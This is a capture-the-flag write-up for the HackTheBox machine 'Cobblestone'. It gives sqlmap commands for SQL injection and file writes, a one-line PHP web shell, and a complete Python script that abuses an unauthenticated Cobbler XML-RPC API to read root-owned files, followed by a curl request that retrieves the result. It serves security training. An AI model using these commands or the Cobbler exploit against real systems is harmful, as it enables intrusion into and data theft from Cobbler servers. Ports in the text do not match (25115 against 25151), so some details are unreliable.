## TL;DR

- The web app had a SQL injection in the suggestion feature, exploitable with sqlmap.
- Dumping the database revealed user credentials, including a hash.
- Cracking the hash gave access to the foothold user shell.
- On the system, the Cobbler service was running internally, which can be abused by manipulating system templates/profiles.
- By exploiting Cobbler, it’s possible to execute commands as root.
- To reach the Cobbler service, SSH port forwarding was required to expose the local/internal port for exploitation.

## Enumeration

### Nmap
The usual basic `nmap` scan:
```bash
$ nmap $target -sV -sC -vv -Pn -oN cobble-def

### Subdomains

Upon visiting the website, we find three domains to visit:

```bash
echo 10.10.11.81 cobblestone.htb vote.cobblestone.htb deploy.cobblestone.htb
```
And we're facing the following web app:

![main](/images/htb/htb-cobble-1.png)

![deploy](/images/htb/htb-cobble-2.png)

![vote](/images/htb/htb-cobble-3.png)

### Basic web recon

Here is what `wappalyzer` showed:

![Wappalyzer](/images/htb/htb-cobble-4.png)

With `whatweb`:

```bash
$ whatweb cobblestone.htb

ERROR Opening: https://cobblestone.htb - Connection refused - connect(2) for "10.10.11.81" port 443
http://cobblestone.htb [200 OK] Apache[2.4.62], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.62 (Debian)], IP[10.10.11.81], JQuery, Script[text/javascript], Title[Cobblestone - Official Website]
```
### Fuzzing

I ran `Ffuf` for both vhosts and directories, nothing out of the usual or important. We move on to the website.

### Poking Around the website
#### Main Domain
![skins](/images/htb/htb-cobble-5.png)

Visiting the main domain `cobblestone.htb`, we find a portal to suggest a Minecraft skin to upload to the website.
There are some default skins, I tried suggesting an already existing skin name, with an invalid IP, and it passed through saying that'll be reviewed by the admin.

I even tried setting up a simple python3 HTTP server, to see if something gets requested, but it lead to nothing.

#### Voting subdomain

The databases for `cobblestone.htb` and `vote.cobblestone.htb` aren't the same, logging in with the user already created at the main platform didn't authenticate us through the `vote.cobblestone.htb`.

So after creating a new account we're facing this:

![votepage1](/images/htb/htb-cobble-6.png)
![votepage2](/images/htb/htb-cobble-7.png)

And all the three already set suggested servers to vote for, aren't approved yet. Furthermore, setting up a python server and suggesting it will
be passed on, but not approved.

![not approved](/images/htb/htb-cobble-8.png)

And the actual upvoting isn't yet set up:

![voting](/images/htb/htb-cobble-9.png)

## Foothold

Now, testing for SQLi in the suggestion of the minecraft server proved fruitful.

```bash
sqlmap -r request.txt -p url --dbs --batch
```

![sqlmap1](/images/htb/htb-cobble-10.png)

```request.txt
POST /suggest.php HTTP/1.1

Cache-Control: max-age=0

```

So we're into something. The field is indeed vulnerable. To test that even more:

```bash
sqlmap -r request.txt -p url -D vote --tables --batch
```

![sqlmap2](/images/htb/htb-cobble-11.png)

## User Flag

Poking around the databse, we can dump this:

![sqlmap3](/images/htb/htb-cobble-12.png)

Note that `evil@sal.htb` was my account, so this databse is useless for now, it's not of internal shit.
We won't attempt to crack the admin's password, it may even be an account created by another player, not the actual DB admin.

Using crackstation, few seconds and we got the user `cobble` and the user flag.

## Pre-User Time-Wasting
>These are some of what I did to gain a rev shell back to my machine. Switching the vpns, UDP to TCP...etc but banging my head against the wall aren't included.

```bash
sqlmap -r request.txt -p url -D vote -T users --dump --batch --no-cast
```
Now we'll go for testing an upload vulnerability.
First with a dummy file:

```bash
echo test > /tmp/test.txt
```

```bash
sqlmap -r request.txt -p url --file-write=/tmp/test.txt --file-dest=/var/www/html/test.txt
```

![sqlmapupload1](/images/htb/htb-cobble-13.png)

The upload is possible, so we try a simple PHP payload:

```php // shell.php
<?php system($_GET['cmd']); ?>
```

```bash
sqlmap -r request.txt -p url --file-write=shell.php --file-dest=/var/www/html/shell.php
```

Which is then confirmed:

```bash
curl "http://cobblestone.htb/shell.php?cmd=id" --output -
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

At this point, I tried a lot of PHP rev shell payloads, uploaded them and accessing them lead to no hitback on the listener.
The only way it worked was to upload a bash reverse shell to the server, and then execute it, all through `curl`.
And proved correct:

## Privilege Escalation

For privilege escalation, we have a very restricted shell, which was painfully reallistic. Until.

Running `ss`:
```bash
ss -tulnp
```

And we have a service at port `TCP/25115`. This was cobbler's used port. Check out what is the [Cobbler](https://cobbler.github.io/) service.

            <p>
                Cobbler is a Linux provisioning and deployment server designed to simplify the setup of network-based installations. It allows administrators to automatically install operating systems, manage system profiles, and configure network boot environments (PXE) across many machines.
            </p>
            <p>Key features include:</p>
            <ul>
                <li><strong>OS provisioning:</strong> Automates the installation of Linux distributions on bare-metal or virtual machines.</li>
                <li><strong>Profile management:</strong> Defines templates for system configurations, including packages, scripts, and network settings.</li>
                <li><strong>PXE boot integration:</strong> Supports network booting for unattended installations.</li>
                <li><strong>Template and scripting support:</strong> Uses templates (Cheetah) for scripts and configuration files to customize installations.</li>
                <li>Essentially, Cobbler streamlines large-scale deployments, making it easier to manage multiple systems consistently and automatically.</li>
            </ul>
        </>
    }
/>


> **Tip:**

So to see what's being hosted in that port, we port forward it using:
```bash
ssh -L 25115:localhost:25115 cobbler@cobblestone.htb
```

Reading what's on [this](https://tnpitsecurity.com/blog/cobbler-multiple-vulnerabilities/) page, leads to the direct solution.

Here is what we're going to do:

<Feedback
    variant="success"
    title="Vector"
    description="The privilege escalation relied on a critical vulnerability in Cobbler (≤ 3.2.1), which exposes an XML-RPC API for
managing profiles, systems, and templates. The vulnerability arises because Cobbler’s generate_script method renders templates using
Cheetah without proper input sanitization. This allows an attacker to perform a template injection, executing arbitrary
Python code as the user running Cobbler (typically root). By crafting a malicious template and forcing Cobbler to render
it—either through profile or system manipulation—the attacker could execute commands with root privileges, effectively taking full
control of the system."
/>

```python
import xmlrpc.client
import traceback

COBBLER_URL = "http://127.0.0.1:25151/RPC2"
TARGET_FILE = "/root/root.txt"    # The file you want to read
DEST_FILE = "/leak"               # Template destination in Cobbler

def connect():
    try:
        return xmlrpc.client.ServerProxy(COBBLER_URL, allow_none=True)
    except:
        traceback.print_exc()
        return None

srv = connect()
tok = srv.login("", -1)

# 1. Create a distro
did = srv.new_distro(tok)
srv.modify_distro(did, "name", "pwn_distro", tok)
srv.modify_distro(did, "arch", "x86_64", tok)
srv.modify_distro(did, "breed", "redhat", tok)
srv.modify_distro(did, "kernel", "/boot/vmlinuz-6.1.0-37-amd64", tok)
srv.modify_distro(did, "initrd", "/boot/initrd.img-6.1.0-37-amd64", tok)
srv.save_distro(did, tok)

# 2. Create a profile
pid = srv.new_profile(tok)
srv.modify_profile(pid, "name", "pwn_profile", tok)
srv.modify_profile(pid, "distro", "pwn_distro", tok)
srv.save_profile(pid, tok)

# 3. Create a system pointing to the target file
sid = srv.new_system(tok)
srv.modify_system(sid, "name", "pwnsys", tok)
srv.modify_system(sid, "profile", "pwn_profile", tok)
srv.modify_system(sid, "template_files", {TARGET_FILE: DEST_FILE}, tok)
srv.save_system(sid, tok)

# 4. Sync changes
srv.sync(tok)

print("[+] Malicious system created.")
print("[+] You can now trigger it using curl to read the file.")
```
After running the previous python script, we can request the flag at `/root/root.txt` using:
```bash
curl -X POST http://127.0.0.1:25151 \
-H "Content-Type: text/xml" \
-d '<?xml version="1.0"?>
<methodCall>
    <methodName>get_template_file_for_system</methodName>
    <params>
        <param><value><string>pwnsys</string></value></param>
        <param><value><string>/leak</string></value></param>
    </params>
</methodCall>'
```

Within the request sent back to us, we will have the flag as a response within the XML returned.

The Python script interacts with Cobbler’s XML-RPC API to exploit the template rendering vulnerability. It performs several actions to manipulate the system configuration and template files:

- **Login:**
Uses `srv.login("", -1)` to authenticate with the Cobbler server (empty credentials are accepted for unauthenticated access).

- **Create a new distribution:**
Calls `srv.new_distro(tok)` to create a custom distribution object, then sets fields such as:
- `name` → “pwn_distro”
- `arch` → “x86_64”
- `breed` → “redhat”
- `kernel` → path to the kernel (`/boot/vmlinuz-6.1.0-37-amd64`)
- `initrd` → path to the initrd image (`/boot/initrd.img-6.1.0-37-amd64`)
- Saves the distribution with `srv.save_distro(did, tok)`

- **Create a new profile:**
Calls `srv.new_profile(tok)` and assigns the distribution, naming the profile “pwn_profile,” then saves it.

- **Create a new system:**
Calls `srv.new_system(tok)` to register a system, sets:
- `name` → “pwnsys”
- `profile` → “pwn_profile”
- `template_files` → a dictionary mapping the target file (`/root/root.txt`) to a location inside the template system (`/leak`)
- Saves the system and calls `srv.sync(tok)` to apply changes.

- **Final curl command:**
Sends a POST request to Cobbler’s XML-RPC endpoint to call `get_template_file_for_system` with the system name and the template path (`/leak`), causing Cobbler to render the template and return the contents of the target file.

This combination allows reading arbitrary files or
potentially executing code because Cobbler renders templates as root, exploiting the template injection vulnerability.
